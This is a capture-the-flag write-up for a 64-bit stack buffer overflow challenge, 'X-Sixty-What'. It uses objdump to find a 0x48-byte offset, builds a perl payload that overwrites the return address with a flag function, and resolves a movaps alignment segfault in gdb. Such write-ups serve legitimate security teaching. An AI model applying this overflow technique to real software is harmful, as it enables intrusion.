# X-Sixty-What

Inspecting the `vuln` function, and adding some annotations around offsets:

```
$ objdump -d -Mintel vuln | sed -n '/^[a-f0-9]\+ <vuln>/,/^$/p'
00000000004012b2 <vuln>:
  4012b2:	f3 0f 1e fa          	endbr64 
  4012b6:	55                   	push   rbp      <--- -0x8
  4012b7:	48 89 e5             	mov    rbp,rsp
  4012ba:	48 83 ec 40          	sub    rsp,0x40 <--- 0x40
  4012be:	48 8d 45 c0          	lea    rax,[rbp-0x40]
  4012c2:	48 89 c7             	mov    rdi,rax
  4012c5:	b8 00 00 00 00       	mov    eax,0x0
  4012ca:	e8 31 fe ff ff       	call   401100 <gets@plt>
  4012cf:	90                   	nop
  4012d0:	c9                   	leave  
  4012d1:	c3                   	ret  
```

We see after filling `0x48` bytes from our buffer we can stomp the return
address. Further glancing at the start of the `flag` function

```console
$ objdump -d -Mintel vuln | sed -n '/^[a-f0-9]\+ <flag>/,/^$/p' | head 
0000000000401236 <flag>:
  401236:	f3 0f 1e fa          	endbr64 
  40123a:	55                   	push   rbp
  40123b:	48 89 e5             	mov    rbp,rsp
  40123e:	48 83 ec 50          	sub    rsp,0x50
  401242:	48 8d 35 bf 0d 00 00 	lea    rsi,[rip+0xdbf]        # 402008 <_IO_stdin_used+0x8>
  401249:	48 8d 3d ba 0d 00 00 	lea    rdi,[rip+0xdba]        # 40200a <_IO_stdin_used+0xa>
  401250:	e8 db fe ff ff       	call   401130 <fopen@plt>
  401255:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  401259:	48 83 7d f8 00       	cmp    QWORD PTR [rbp-0x8],0x0
```

Then trying the address `0x401236` (using little endian):

````
$ perl -E 'say("A" x 0x48 . "\x36\x12\x40\x00\x00\x00\x00\x00")' | ./vuln 
Welcome to 64-bit. Give me a string that gets you the flag: 
Segmentation fault (core dumped)
```

We get an unexpected segfault, let's debug with `gdb`:

```
$ gdb -q ./vuln 
Reading symbols from ./vuln...
(No debugging symbols found in ./vuln)
(gdb) run < <(perl -E 'say("A" x 0x48 . "\x36\x12\x40")')
Starting program: /home/mjh/src/writeups/picoctf2022/x-sixty-what/vuln < <(perl -E 'say("A" x 0x48 . "\x36\x12\x40\x00\x00\x00\x00\x00")')
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Welcome to 64-bit. Give me a string that gets you the flag: 

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7e026f3 in ?? () from /usr/lib/libc.so.6
(gdb) x/i $rip
=> 0x7ffff7e026f3:	movaps XMMWORD PTR [rsp+0x40],xmm0
(gdb) p/x $rsp+0x40
$1 = 0x7fffffffa4a8
```

A quick search online informs us that the operand to `movaps` must be aligned
on a 16 byte boundary, but this is not the case for `0x7fffffffa4a8`.
Thankfully, there is a hint to help us around this: 

> Jump to the second instruction (the one after the first push) in the flag
> function, if you're getting mysterious segmentation faults.

Indeed, using the second address allows our exploit to be executed as desired.
